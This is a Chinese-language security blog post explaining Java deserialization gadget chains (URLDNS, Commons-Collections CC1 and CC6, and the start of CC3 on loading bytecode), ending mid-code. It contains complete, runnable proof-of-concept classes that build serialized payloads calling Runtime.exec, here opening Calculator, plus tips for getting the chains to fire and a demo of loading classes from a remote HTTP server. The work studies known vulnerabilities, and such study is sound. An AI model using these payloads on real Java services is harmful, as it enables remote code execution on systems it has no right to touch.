---
title: Java安全之反序列化
author: patrik
tags:
  - Java安全
categories:
  - "安全\U0001F510"
top: 23
abbrlink: cd0a9e83
date: 2024-03-12 12:00:00
---



## URLDNS
```
Gadget Chain:
	HashMap->readObject()
	HashMap->hash()
	URL->hashCode()
	URLStreamHandler->hashCode()
	URLStreamHandler->getHostAddress()
	InetAddress->getByName()

```

1、URLDNS.java
![](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/12/image-20240228150839565.png)
看到 `URLDNS` 类的 `getObject` ⽅法，ysoserial会调⽤这个⽅法获得Payload。这个⽅法返回的是⼀个对 象，这个对象就是最后将被序列化的对象，在这⾥是 `HashMap` 。触发反序列化的⽅法是 `readObject` ，直奔 `HashMap` 类的 `readObject` 方法。

2、HashMap->readObject()
![](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/12/image-20240228151352281.png)
这里通过`for`循环来将`HashMap`中存储的`key`通过`K key = (K) s.readObject();`来进行反序列化，在这之后调用`putVal()`和`hash()`函数，跟进`hash()`函数。

3、HashMap->hash()
![](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/12/image-20240228152317540.png)
`URLDNS`中使用的`key`是一个`java.net.URL`对象，查看`java/net/URL.java`中其`hashCode`方法。

4、URL->hashCode()
![](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/12/image-20240228152707970.png)
![](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/12/image-20240228152956544.png)
此时，`handler`是`URLStreamHandler`对象（的某个⼦类对象）,继续跟进其`hashCode`方法。

5、URLStreamHandler->hashCode()
![](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/12/image-20240228153301154.png)
在这里调用了`getHostAddress`方法，继续跟进。

6、URLStreamHandler->getHostAddress()
![](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/12/image-20240228153447940.png)
此处`InetAddress.getByName(host)`的作用是根据主机名，获取其IP地址，在网络上为一次DNS查询。

可以使用反连平台来验证一下：
生成payload。
![](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/12/image-20240228155111018.png)
调试/执行
![](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/12/image-20240228155214573.png)
查看请求成功，证明存在反序列化漏洞。
![](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/12/image-20240228155614598.png)
整个Gadget如下：
	HashMap->readObject()
	HashMap->hash()
	URL->hashCode()
	URLStreamHandler->hashCode()
	URLStreamHandler->getHostAddress()
	InetAddress->getByName()

构造Gadget：
1、初始化`java.net.URL`对象，作为`key`放在`java.util.HashMap`中；
2、设置这个 `URL` 对象的 `hashCode` 为初始值 `-1` ，这样反序列化时将会重新计算其 `hashCode` ，才能触发到后⾯的DNS请求即调用`URL->hashCode()`；

其他：ysoserial为了防⽌在⽣成Payload的时候也执⾏了URL请求和DNS查询，所以重写了⼀个 `SilentURLStreamHandler` 类，这不是必须的。

## CC1
### Intro Demo
简单的代码demo弹出计算器demo
![](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/12/image-20240228162933925.png)
涉及到了几个接口和类：
```
TransformedMap
Transformer
ConstantTransformer
InvokerTransformer
ChainedTransformer
```
1、TransformedMap
`TransformedMap`⽤于对Java标准数据结构Map做⼀个修饰，被修饰过的Map在添加新的元素时，将可以执⾏⼀个**回调**。我们通过下⾯这⾏代码对`innerMap`进⾏修饰，传出的`outerMap`即是修饰后的Map：
```java
Map outerMap = TransformedMap.decorate(innerMap, keyTransformer, valueTransformer);
```
其中，`keyTransformer`是**处理新元素的Key的回调**，`valueTransformer`是**处理新元素的value的回调**。
我们这⾥所说的”回调“，并不是传统意义上的⼀个回调函数，⽽是⼀个实现了`Transformer`接⼝的类。

2、Transformer
`Transformer`是⼀个接⼝，它只有⼀个待实现的⽅法：
```java
public interface Transformer { 
	public Object transform(Object input);
}
```
`TransformedMap`在转换Map的新元素时，就会调⽤`transform`⽅法，这个过程就类似在调⽤⼀个”回调函数“，这个回调的参数是原始对象。

3、ConstantTransformer
`ConstantTransformer`是实现了`Transformer`接⼝的⼀个类，它的过程就是在构造函数的时候传⼊⼀个对象，并在`transform`⽅法将这个对象再返回：
```java
public ConstantTransformer(Object constantToReturn) {
	super(); 
	iConstant = constantToReturn;
}

public Object transform(Object input) {
	return iConstant;
}
```
所以他的作⽤其实就是包装任意⼀个对象，在执⾏回调时返回这个对象，进⽽⽅便后续操作。

4、InvokerTransformer
`InvokerTransformer`是实现了`Transformer`接⼝的⼀个类，这个类可以⽤来执⾏任意⽅法，这也是反序列化能执⾏任意代码的关键。

在实例化这个`InvokerTransformer`时，需要传⼊三个参数，第⼀个参数是待执⾏的⽅法名，第⼆个参数 是这个函数的参数列表的参数类型，第三个参数是传给这个函数的参数列表：
```java
public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) {
	super(); 
	iMethodName = methodName; 
	iParamTypes = paramTypes; iArgs = args;
}
```


5、ChainedTransformer
`ChainedTransformer`也是实现了`Transformer`接⼝的⼀个类，它的作⽤是将内部的多个`Transformer`串在⼀起。通俗来说就是，前⼀个回调返回的结果，作为后⼀个回调的参数传⼊，我们画⼀个图做示意：
![](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/12/image-20240229143243534.png)
```java
public ChainedTransformer(Transformer[] transformers) { 
	super(); 
	iTransformers = transformers;
 }

public Object transform(Object object) { 
	for (int i = 0; i < iTransformers.length; i++) {
	 object = iTransformers[i].transform(object); } return object;
 }
```
再看demo
```java
Transformer[] transformers = new Transformer[]{  
	new ConstantTransformer(Runtime.getRuntime()),  
	new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"open -a Calculator.app"}),  
};  
  
Transformer transformerChain = new ChainedTransformer(transformers);
```
创建了一个`ChainedTransformer`,其中包含两个`Transformer`:
第一个是`ConstantTransformer`，直接返回当前环境的Runtime对象；
第二个是`InvokerTransformer`，执行Runtime对象的exec方法，参数为`open -a Calculator.app`。
`transformerChain`用于回调。

```java
Map innerMap = new HashMap();  
Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);  
```
包装`innerMap`，使⽤的前⾯说到的`TransformedMap.decorate`
触发回调：向Map中放入一个新的元素
```java
outerMap.put("test", "xxxx");
```

Demo执行本地测试的类，在实际的反序列化中需将最终生成的`outerMap`对象变为一个序列化流。
### TransformedMap Gadget
##### AnnotationInvocationHandler
触发漏洞的核心，在于需要向Map中添加一个新的元素。在Demo中，是通过手动执行`outerMap.put("test", "xxxx");`来触发漏洞，但在实际反序列化时，需找到一个类，它在反序列化的`readObject`逻辑里有类似的写入操作。

这个类就是`sun.reflect。annotation.AnnotationInvocationHandler`，我们查看它的`readObject`方法（jdk 8u71前后做了相关修改，下面的是8u71以前的代码）：
![](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/12/image-20240229150331365.png)
核心逻辑：
`Map.Entry<String, Object> memberValue : memberValues.entrySet()`
`memberValue.setValue(...)`
`memberValues`就是反序列化后得到的`Map`，也是经过了`TransformedMap`修饰的对象，这里遍历了它的所有元素，并依次设置值。在调用`setValue`设置值的时候就会触发`TransformedMap`里注册的`Transform`，进而执行我们为其精心设计的任意代码。

所以在构造POC时，就需要创建一个`AnnotationInvocationHandler`对象，并将前面构造的`HashMap`设置进来：
```java
Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler"); Constructor construct = clazz.getDeclaredConstructor(Class.class, Map.class); 
construct.setAccessible(true); 
Object obj = construct.newInstance(Retention.class, outerMap);
```
这里因为`sun.reflect.annotation.AnnotationInvocationHandler`是在JDK内部的类，不能直接使用new来实例化。我使用反射获取到了它的构造方法，并将其设置成外部可见的，再调用就可以实例化了。

`AnnotationInvocationHandler`类的构造函数有两个参数，第一个参数是一个`Annotation`类；第二个是参数就是前面构造的Map。
	思考：什么是Annotation类？为什么我这里需要使用`Retention.class`？

##### 为什么需要使用反射？

将构造的`AnnotationInvocationHandler`的对象生产序列化流：
```java
ByteArrayOutputStream barr = new ByteArrayOutputStream();  
ObjectOutputStream oos = new ObjectOutputStream(barr);  
oos.writeObject(obj);  
oos.close();
```

将上述代码拼接到demo代码后面，尝试组成完整的POC：
```java
package com.govuln.deserialization;  
  
import org.apache.commons.collections.Transformer;  
import org.apache.commons.collections.functors.ChainedTransformer;  
import org.apache.commons.collections.functors.ConstantTransformer;  
import org.apache.commons.collections.functors.InvokerTransformer;  
import org.apache.commons.collections.map.TransformedMap;  
import org.apache.commons.io.output.ByteArrayOutputStream;  
  
import java.io.ByteArrayInputStream;  
import java.io.ObjectInputStream;  
import java.io.ObjectOutputStream;  
import java.lang.annotation.Retention;  
import java.lang.reflect.Constructor;  
import java.util.HashMap;  
import java.util.Map;  
  
public class CommonsCollectionsIntro11 {  
public static void main(String[] args) throws Exception {  
Transformer[] transformers = new Transformer[]{  
new ConstantTransformer(Runtime.getRuntime()),  
new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"open -a Calculator.app"}),  
};  
  
Transformer transformerChain = new ChainedTransformer(transformers);  
Map innerMap = new HashMap();  
  
innerMap.put("test", "xxxx");  
Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);  
  
Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");  
Constructor construct = clazz.getDeclaredConstructor(Class.class, Map.class);  
construct.setAccessible(true);  
Object obj = construct.newInstance(Retention.class, outerMap);  
  
ByteArrayOutputStream barr = new ByteArrayOutputStream();  
ObjectOutputStream oos = new ObjectOutputStream(barr);  
oos.writeObject(obj);  
oos.close();  
  
System.out.println(barr);  
ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));  
Object o = (Object)ois.readObject();  
  
}  
}
```
![](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/12/image-20240229153135353.png)
运行后在`writeObject`的时候异常了`java.io.NotSerializableException: java.lang.Runtime`。

##### 仍然异常
原因是，Java中不是所有对象都支持序列化，**待序列化的对象和所有它使用的内部属性对象，必须都实现了**`java.io.Serializable`接口。而我们最早传给`ConstantTransformer`的是`Runtime.getRuntime()`，Runtime类是没有实现`java.io.Serializable` 接口的，所以不允许被序列化。

结合反射篇，可以通过反射来获取当前上下文中的Runtime对象，而不需要直接使用这个类：
例：
```java
Method f = Runtime.class.getMethod("getRuntime"); 
Runtime r = (Runtime) f.invoke(null); 
r.exec("open -a Calculator.app");
```
转换为Transformer的写法：
```java
Transformer[] transformers = new Transformer[] {  
	new ConstantTransformer(Runtime.class),  
	new InvokerTransformer("getMethod", new Class[] { String.class,  
		Class[].class }, new Object[] { "getRuntime",  
		new Class[0] }),  
	new InvokerTransformer("invoke", new Class[] { Object.class,  
		Object[].class }, new Object[] { null, new Object[0] }),  
	new InvokerTransformer("exec", new Class[] { String.class },  
		new String[] { "open -a Calculator.app" }),  
};
```
和Demo中最大的区别是将`Runtime.getRuntime()`换成了`Runtime.class`，前者是一个`java.lang.Runtime`对象，后者是一个`java.lang.Class`对象。Class类有实现Serializable接口，所以可以被序列化。

![](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/12/image-20240229154431828.png)
修改Transformer数组代码后执行未报错未出现异常且输出了序列化后的数据流，但反序列化时仍未能弹出计算器？

这里与`AnnotationInvocationHandler`类的逻辑有关，通过动态调试可以发现，在`AnnotationInvocationHandler.readObject`的逻辑中，有一个if语句判断`memberType`是否为null，在其不为null时才会进入执行`setValue`,否则则不会进入也不会触发漏洞
![](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/12/image-20240229160052419.png)
如何使其不为null，顺利进入执行，触发漏洞呢？
涉及到Java注释相关的技术，不详述。
两个条件：
1、`sun.reflect.annotation.AnnotationInvocationHandler`构造函数的第一个参数必须是Annotation的子类，且其中必须含有至少一个方法，假设方法为X
2、被`TransformedMap.decorate`修饰的Map中必须有一个键名为X的元素

满足两个条件：
1、前面的代码使用`Retention.class`的原因，因为其有一个方法名为Value；
![](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/12/image-20240229160802612.png)

2、再给Map中放入一个Key为Value的元素：
```java
innerMap.put("value", "xxxx");
```
再执行成功弹出计算器了（jdk8u65）
![](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/12/image-20240229160901507.png)
##### jdk版本问题
上述的测试是在8u71以前的版本测试的，因为在8u71以后大概是2015年12月的时候，Java官方修改了`sun.reflect.annotation.AnnotationInvocationHandler`的readObject函数
https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/f8a528d0379d

改动后，不再直接 使用反序列化得到的Map对象，而是新建了一个LinkedHashMap对象，并将原来的键值添加进去。

所以，后续对Map的操作都是基于这个新的LinkedHashMap对象，而原来我们精心构造的Map不再执行set或put操作，也就不会触发RCE了。
### LazyMap Gadget（ysoserial）
#### 异同
关于ysoserial的CC1链使用到了LazyMap，而非刚才所用的TransformedMap。
![](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/12/image-20240229162121273.png)
同:
其实二者类似，
- 都来自于`Common-Collections`库，
- 都继承了`AbstractMapDecorator`。

异:
- `TransformedMap`是在写入元素的时候执行`transform`
- `LazyMap`是在其get方法中执行的`factory.transform`（`LazyMap`的作用是“懒加载”，在get找不到值的时候，它会调用`factory.transform`方法去获取一个值）

相较于`TransformedMap`，`LazyMap`的后续利用方法较为复杂些，原因：
`sun.reflect.annotation.AnnotationInvocationHandler`的`readObject`方法中并没有直接调用到Map的get方法

所以ysoserial找到了另一条路，通过`AnnotationInvocationHandler`类的`invoke`方法调用到get：
![](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/12/image-20240229163128654.png)
如何调用到`AnnotationInvocationHandler.invoke`呢？
ysoserial的作者想到的是利用Java的对象代理。
#### Java对象代理
作为一门静态语言，如果想劫持一个对象内部的方法调用，实现类似PHP的魔术方法`__call`要用到`java.reflect.Proxy`：
```java
Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[] {Map.class}, handler);
```
`Proxy.newProxyInstance`的第一个参数是ClassLoader，我们用默认的即可；第二个参数是我们需要代理的对象集合；第三个参数是一个实现了InvocationHandler接口的对象，里面包含了具体代理的逻辑。

例如，写一个ExampleInvocationHandler类：
```java
package org.vulhub.Ser;

import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Method;
import java.util.Map;

public class ExampleInvocationHandler implements InvocationHandler {
    protected Map map;

    public ExampleInvocationHandler(Map map) {
        this.map = map;
    }

    @Override
    public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {
        if (method.getName().compareTo("get") == 0) {
            System.out.println("Hook method:" + method.getName());
            return "Hacked Object";
        }

        return method.invoke(this.map, args);
    }
}
```
ExampleInvocationHandler类实现了Invoke方法，作用是监控到调用的方法名是get的时候，返回一个特殊字符串`hacked Object`。

在外部调用这个ExampleInvocationHandler：
```java
package org.vulhub.Ser;

import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

public class App {
    public static void main(String[] args) throws Exception{
        InvocationHandler handler = new ExampleInvocationHandler(new HashMap());
        Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[] {Map.class}, handler);

        proxyMap.put("hello", "world");
        String result = (String) proxyMap.get("hello");
        System.out.println(result);

    }
}
```
运行App后，发现返回特殊字符串`hacked Object`，说明调用的方法名是get
![](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/12/image-20240301114100792.png)
回看`sun.reflect.annotation.AnnotationInvocationHandler`发现这个类其实就是一个`InvocationHandler`，如果将这个对象用Proxy进行代理，那么readObject时，只要调用任意方法就会进入到`AnnotationInvocationHandler#invoke`中，进而触发`LazyMap#get`
![](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/12/image-20240301114828667.png)
![](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/12/image-20240301115709144.png)
#### Poc修改
在使用TransformedMap的Poc基础上进行修改
1、LazyMap替换TransformedMap
```java
	//Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);
    Map outerMap = LazyMap.decorate(innerMap, transformerChain);
```
2、对`sun.reflect.annotation.AnnotationInvocationHandler`对象进行Proxy代理
```java
//Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
//        Constructor construct = clazz.getDeclaredConstructor(Class.class, Map.class);
//        construct.setAccessible(true);
//        Object obj = construct.newInstance(Retention.class, outerMap);

        Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor construct = clazz.getDeclaredConstructor(Class.class, Map.class);
        construct.setAccessible(true);
        InvocationHandler handler = (InvocationHandler) construct.newInstance(Retention.class, outerMap);
        //代理后的对象叫作ProxyMap
        Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[]{Map.class}, handler);
```

3、用`AnnotationInvocationHandler`对ProxyMap进行包裹（代理后的对象不能直接序列化）(因为入口点为`sun.reflect.annotation.AnnotationInvocationHandler.readObject`)
```java
        handler = (InvocationHandler) construct.newInstance(Retention.class, proxyMap);

        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        //oos.writeObject(obj);
        oos.writeObject(handler);
        oos.close();
```
最终Poc
```java
package com.govuln.deserialization;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import org.apache.commons.io.output.ByteArrayOutputStream;
import java.io.ByteArrayInputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

public class CommonsCollectionsLazyMap {
    public static void main(String[] args) throws Exception {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class,
                        Class[].class}, new Object[]{"getRuntime",
                        new Class[0]}),
                new InvokerTransformer("invoke", new Class[]{Object.class,
                        Object[].class}, new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec", new Class[]{String.class},
                        new String[]{"open -a Calculator.app"}),
        };

        Transformer transformerChain = new ChainedTransformer(transformers);
        Map innerMap = new HashMap();

//        innerMap.put("value", "xxxx");

//        Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);
        //1、LazyMap替换TransformedMap
        Map outerMap = LazyMap.decorate(innerMap, transformerChain);

//        Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
//        Constructor construct = clazz.getDeclaredConstructor(Class.class, Map.class);
//        construct.setAccessible(true);
//        Object obj = construct.newInstance(Retention.class, outerMap);

        //2、对sun.reflect.annotation.AnnotationInvocationHandler对象进行Proxy
        Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor construct = clazz.getDeclaredConstructor(Class.class, Map.class);
        construct.setAccessible(true);
        InvocationHandler handler = (InvocationHandler) construct.newInstance(Retention.class, outerMap);
        //代理后的对象叫作ProxyMap
        Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[]{Map.class}, handler);

        //3、用AnnotationInvocationHandler对ProxyMap进行包裹（代理后的对象不能直接序列化）
        handler = (InvocationHandler) construct.newInstance(Retention.class, proxyMap);

        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
//        oos.writeObject(obj);
        oos.writeObject(handler);
        oos.close();

        System.out.println(barr);
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
        Object o = (Object) ois.readObject();
    }
}
```
成功弹出计算器
![](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/12/image-20240301141757415.png)
补充：
调试上述Poc时会发现弹出两个计算器或者没有执行到`readObject`的时候就弹出了计算器，其原因为：在使用Proxy代理了map对象后，我们在任何地方执行map的方法就会触发Payload弹出计算器，所以，在本地调试代码的时候，因为调试器会在下面调用一些toString之类的方法，导致不经意间触发了命令。

而ysoserial对此进行了一些处理它在POC的最后才将执行命令的Transformer数组设置到`transformerChain`中，原因是避免本地生成序列化流的程序执行到命令（在调试程序的时候可能会触发一次`Proxy#invoke`)
![](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/12/image-20240301142442752.png)
另外，ysoserial中的`Transformer`数组，在最后增加了一个`ConstantTransformer(1)`，
可能是为了隐藏异常日志中的一些信息。
![](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/12/image-20240301142651157.png)

## CC6
之前说到CC1的利用链和`LazyMap`原理，但8u71版本以后，就无法使用该链了，其主要原因是`sun.reflect.annotation.AnnotationInvocationHandler#readObject`的逻辑变了。

在ysoserial中CC6是`commons-collections`这个库中比较通用的链，能够解决高版本Java的利用问题。
### 简化链
简化的链：
```
/*
Gadget chain:

java.io.ObjectInputStream.readObject() 
	java.util.HashMap.readObject() 
		java.util.HashMap.hash()

org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()

org.apache.commons.collections.keyvalue.TiedMapEntry.getValue() 
						org.apache.commons.collections.map.LazyMap.get()

org.apache.commons.collections.functors.ChainedTransformer.transform()

org.apache.commons.collections.functors.InvokerTransformer.transform()
							java.lang.reflect.Method.invoke() 
								java.lang.Runtime.exec() 
*/
```
主要看最开始到`org.apache.commons.collections.map.LazyMap.get()`这一部分，`LazyMap#get`后面的部分在上面已经提到了。

**解决Java高版本利用问题，实际上就是在找上下文中是否还有其他调用`LazyMap#get()`的地方。**

找到的类是`org.apache.commons.collections.keyvalue.TiedMapEntry`，其`getValue`方法中调用了`this.map.get`，而其`hashCode`方法调用了`getValue`方法。
![](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/12/image-20240301150603120.png)
![](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/12/image-20240301150606944.png)

所以接着要触发`LazyMap#get()`就要找到哪里调用了`TiedMapEntry#hashCode`：
	在ysoserial中：
		`java.util.HashSet#readObject`
		`HashMap#put()`
		`HashMap#hash(key)`
		`TiedMapEntry#hashCode()`
	而实际上发现，可以简化
		`java.util.HashMap#readObject`
		`HashMap#hash()`

在HashMap的readObject方法中，调用了`hash(key)`
![](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/12/image-20240301151319895.png)
而hash方法中又调用了`key.hashcode()`
![](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/12/image-20240301151344317.png)
所以只需让这个key等于TiedMapEntry对象，即可构成一个完整的Gadget。
### 构造Poc
1、构造恶意LazyMap
```java
            //避免本地调试触发命令执行，先构造一个fakeTransformers对象在最后要生成Payload时再将真正的Transformer替换进去。
        Transformer[] fakeTransformers = new Transformer[] {new ConstantTransformer(1)};
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] { String.class,
                        Class[].class }, new Object[] { "getRuntime",
                        new Class[0] }),
                new InvokerTransformer("invoke", new Class[] { Object.class,
                        Object[].class }, new Object[] { null, new Object[0] }),
                new InvokerTransformer("exec", new Class[] { String.class },
                        new String[] { "open -a Calculator.app" }),
                new ConstantTransformer(1),
        };
        Transformer transformerChain = new ChainedTransformer(fakeTransformers);

            //不再使用原ysoserial的CommonsCollections6中的HashSet，直接使用HashMap
        Map innerMap = new HashMap();
        Map outerMap = LazyMap.decorate(innerMap, transformerChain);
```
2、构造恶意TiedMapEntry
```java
            //将上面构造的恶意LazyMap对象outerMap作为参数传入TiedMapEntry构造函数,作为其map的属性
        TiedMapEntry tme = new TiedMapEntry(outerMap, "keykey");
            //新建一个HashMap对象，将上面构造的恶意TiedMapEntry对象tme作为其key，"valuevalue"作为其value
        Map expMap = new HashMap();
        expMap.put(tme, "valuevalue");
```
3、将expMap作为对象序列化
```java
    //将真正的transformers替换进来
        Field f = ChainedTransformer.class.getDeclaredField("iTransformers");
        f.setAccessible(true);
        f.set(transformerChain, transformers);

            //生成序列化字符串
        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(expMap);
        oos.close();
    // 本地测试触发
        System.out.println(barr);
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
        Object o = (Object)ois.readObject();
```

执行后并未弹出计算器
![](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/12/image-20240301154441542.png)
调试：
关键在LazyMap的get方法内，`map.containsKey(key)`的值在最后会为true，最后触发命令执行的`transform()`所在的if语句并没有进入，也未能执行。
![](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/12/image-20240301164605809.png)
探其原因发现，HashMap的put方法中，也调用到了`hash(key)`
![](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/12/image-20240301161132862.png)
![](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/12/image-20240301165221342.png)
![](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/12/image-20240301165251699.png)
这就导致`LazyMap`的利用链在这里被调用了一遍，即使在开头使用了`fakeTransformers`，但仍然在过程中产生了影响，导致没能成功执行命令。

解决办法：
将值为keykey的`Key`从outerMap中移除
`outerMap.remove("keykey");`

修改Poc后 执行成功弹出计算器
![](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/12/image-20240301165619747.png)
这个链便于理解，且可以在Java 7和8的⾼版本触发，没有版本限制。



## CC3
### 动态加载字节码方法
0、什么是“字节码”
具体的“字节码”定义：
Java字节码（ByteCode）其实是指Java虚拟机执行使用的一类指令，通常被存储在.class文件中。

众所周知，不同平台、不同CPU的计算机指令有差异，但因为Java是一门跨平台的编译型语言，所以这些差异对于上层开发者来说是透明的，上层开发者只需要将自己的代码编译一次，即可运行在不同平台的JVM虚拟机中。

不同平台的源代码(.java)-->对应的编译器（例javac编译器）-->字节码文件(.class)-->JVM虚拟机

需要理解的是广义的“字节码”——即**所有能够恢复成一个类并在JVM虚拟机里加载的字节序列，都在我们的探讨范围内。**
1、利用`URLClassLoader`加载远程class文件
ClassLoader就是加载字节码文件的最基础的方法。
	`ClassLoader`是什么呢？简单来说，它就是⼀个“加载器”，告诉Java虚拟机如何加载这个类。关于这个点，后⾯还有很多有趣的漏洞利⽤⽅法，这⾥先不展开说了。Java默认的`ClassLoader`就是根据类名来加载类，这个类名是类完整路径，如`java.lang.Runtime`。

这里主要来说一下这个ClassLoader：`URLClassLoader`
`URLClassLoader`实际上是平时默认使用的`AppClassLoader`的父类，所以解释`URLClassLoader`的工作过程其实就是在解释默认的Java类加载器的工作流程。

正常情况下，Java会根据配置项`sun.boot.class.path`和`java.class.path`中列举到的基础路径（这些路径是经过处理后的`java.net.URL`类）来寻找.class文件来加载，而基础路径分为以下三种情况:
- URL未以斜杠`/`结尾，则认为是一个jar文件，使用`JarLoader`来寻找类，即为在Jar包中寻找.class文件
- URL以斜杠`/`结尾，且协议名是`file`，则使用`FileLoader`来寻找类，即为在本地文件系统中寻找.class文件
- URL以斜杠`/`结尾，且协议名不是`file`，则使用最基础的`Loader`来寻找类
正常遇到的是前两种，那什么时候才会使用`Loader`来寻找类呢？显然是非`file`协议的情况，最常见的就是`http`协议。（Java的URL也支持其他协议不用深究）

使用HTTP协议来测试，看Java能否从远程HTTP服务器上加载.class文件：
在目录下放置`Hello.class`
```java
package evil;  
  
public class Hello {  
    static {  
        System.out.println("Hello World");  
    }  
}
```
```bash
javac Hello.java
python3 -m http.server 8000
```

```java
package com.govuln.bytes;  
  
import java.net.URL;  
import java.net.URLClassLoader;  
  
public class HelloClassLoader  
{  
    public static void main( String[] args ) throws Exception  
    {  
        URL[] urls = {new URL("http://localhost:8000/")};  
        URLClassLoader loader = URLClassLoader.newInstance(urls);  
        Class c = loader.loadClass("Hello");  
        c.newInstance();  
    }  
}
```
![](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/12/image-20240304120856519.png)
成功请求到`Hello.class`，并执行了文件里的字节码，打印输出了“Hello World”
所以，作为攻击者，如果我们能够控制目标Java ClassLoader的基础路径为一个http服务器，则可以利用远程加载的方式执行任意代码了。

2、利用ClassLoader#defineClass直接加载字节码
在加载class文件（远程/本地）的过程中，都调用了这三种方法：
`ClassLoader#loadClass`-->`ClassLoader#findClass`-->`ClassLoader#defineClass`
- `loadClass`的作用是从已加载的类缓存、父加载器等位置寻找类（这里实际上是双亲委派机制），在前面没有找到的情况下，执行`findClass` 
- `findClass`的作用是根据基础URL指定的方式来加载类的字节码，可能会在本地文件系统、jar包或远程http服务器上读取字节码，然后交给`defineClass`
- `defineClass`的作用是处理前面传入的字节码，将其处理成真正的Java类
所以，真正核心的部分其实是`defineClass` ，它决定了如何将一段字节流转变成一个Java类，Java默认的`ClassLoader#defineClass`是一个native方法，逻辑在JVM的C语言代码中。

例，如何让系统的`defineClass`来直接加载字节码：
```java
package com.govuln.bytes;  
  
import org.apache.commons.codec.binary.Base64;  
  
import java.lang.reflect.Method;  
  
public class HelloDefineClass {  
    public static void main(String[] args) throws Exception {  
        Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", String.class, byte[].class, int.class, int.class);  
        defineClass.setAccessible(true);  
  
        // source: bytecodes/Hello.java  
